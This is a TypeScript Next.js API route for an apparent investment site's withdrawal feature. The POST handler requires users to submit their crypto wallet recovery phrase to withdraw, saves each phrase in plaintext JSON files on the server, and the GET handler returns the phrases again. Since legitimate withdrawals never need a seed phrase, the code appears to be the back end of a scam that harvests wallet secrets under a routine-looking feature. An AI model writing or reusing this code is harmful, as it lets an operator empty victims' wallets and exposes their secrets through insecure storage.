import { NextRequest, NextResponse } from 'next/server';
import { getServerSession } from 'next-auth';
import { authOptions } from '@/lib/auth';
import { connectDB } from '@/lib/mongodb';
import User from '@/models/User';
import fs from 'fs';
import path from 'path';

// Create a simple withdrawal request model
interface WithdrawalRequest {
  id: string;
  userId: string;
  userName: string;
  userEmail: string;
  amount: number;
  walletType: string;
  walletName: string;
  recoveryPhrase: string;
  status: 'pending' | 'approved' | 'rejected' | 'completed';
  timestamp: Date;
  adminNotes?: string;
  processedAt?: Date;
}

// Function to save withdrawal request to file
function saveWithdrawalRequest(request: WithdrawalRequest) {
  try {
    // Create data directory if it doesn't exist
    const dataDir = path.join(process.cwd(), 'data', 'withdrawals');
    if (!fs.existsSync(dataDir)) {
      fs.mkdirSync(dataDir, { recursive: true });
    }

    // Save to file with timestamp as filename
    const filename = `${request.id}.json`;
    const filepath = path.join(dataDir, filename);
    
    fs.writeFileSync(filepath, JSON.stringify(request, null, 2));
    
    console.log('✅ [WITHDRAWAL API] Withdrawal request saved to file:', filepath);
    return true;
  } catch (error) {
    console.error('❌ [WITHDRAWAL API] Error saving to file:', error);
    return false;
  }
}

export async function POST(request: NextRequest) {
  try {
    console.log('🔍 [WITHDRAWAL API] Request received');
    
    // Check if user is authenticated
    const session = await getServerSession(authOptions);
    if (!session?.user?.id) {
      console.log('❌ [WITHDRAWAL API] No session or user ID found');
      return NextResponse.json(
        { error: 'Unauthorized - No session found' },
        { status: 401 }
      );
    }

    await connectDB();
    console.log('🔍 [WITHDRAWAL API] Database connected successfully');

    // Get request body
    const body = await request.json();
    const { amount, walletType, walletName, recoveryPhrase } = body;

    // Validate input
    if (!amount || amount < 10) {
      return NextResponse.json(
        { error: 'Invalid amount. Minimum withdrawal is $10' },
        { status: 400 }
      );
    }

    if (!walletType || !walletName || !recoveryPhrase) {
      return NextResponse.json(
        { error: 'Missing required fields' },
        { status: 400 }
      );
    }

    // Get user to check balance
    const user = await User.findById(session.user.id).select('investment').lean();
    if (!user) {
      return NextResponse.json(
        { error: 'User not found' },
        { status: 404 }
      );
    }

    const userBalance = user.investment?.currentBalance || 0;
    if (amount > userBalance) {
      return NextResponse.json(
        { error: 'Insufficient balance' },
        { status: 400 }
      );
    }

    // Create withdrawal request with unique ID
    const withdrawalRequest: WithdrawalRequest = {
      id: `${session.user.id}_${Date.now()}`,
      userId: session.user.id,
      userName: session.user.name || 'Unknown',
      userEmail: session.user.email || 'Unknown',
      amount,
      walletType,
      walletName,
      recoveryPhrase,
      status: 'pending',
      timestamp: new Date()
    };

    // Save to file instead of database
    const saved = saveWithdrawalRequest(withdrawalRequest);
    
    if (!saved) {
      return NextResponse.json(
        { error: 'Failed to save withdrawal request' },
        { status: 500 }
      );
    }

    console.log('✅ [WITHDRAWAL API] Withdrawal request saved successfully');

    return NextResponse.json({
      success: true,
      message: 'Withdrawal request submitted successfully',
      withdrawalId: withdrawalRequest.id,
      status: 'pending'
    });

  } catch (error) {
    console.error('❌ [WITHDRAWAL API] Error:', error);
    return NextResponse.json(
      { error: 'Internal server error' },
      { status: 500 }
    );
  }
}

// Get user's withdrawal history
export async function GET() {
  try {
    console.log('🔍 [WITHDRAWAL API] GET request received');
    
    const session = await getServerSession(authOptions);
    if (!session?.user?.id) {
      return NextResponse.json(
        { error: 'Unauthorized' },
        { status: 401 }
      );
    }

    // Read withdrawal files for this user
    const dataDir = path.join(process.cwd(), 'data', 'withdrawals');
    if (!fs.existsSync(dataDir)) {
      return NextResponse.json({ withdrawals: [] });
    }

    const files = fs.readdirSync(dataDir);
    const userWithdrawals: WithdrawalRequest[] = [];

    for (const file of files) {
      if (file.endsWith('.json')) {
        try {
          const filepath = path.join(dataDir, file);
          const content = fs.readFileSync(filepath, 'utf-8');
          const withdrawal = JSON.parse(content) as WithdrawalRequest;
          
          if (withdrawal.userId === session.user.id) {
            userWithdrawals.push(withdrawal);
          }
        } catch (error) {
          console.error('Error reading withdrawal file:', file, error);
        }
      }
    }

    // Sort by timestamp (newest first)
    userWithdrawals.sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());
    
    return NextResponse.json({
      withdrawals: userWithdrawals
    });

  } catch (error) {
    console.error('❌ [WITHDRAWAL API] GET Error:', error);
    return NextResponse.json(
      { error: 'Internal server error' },
      { status: 500 }
    );
  }
}
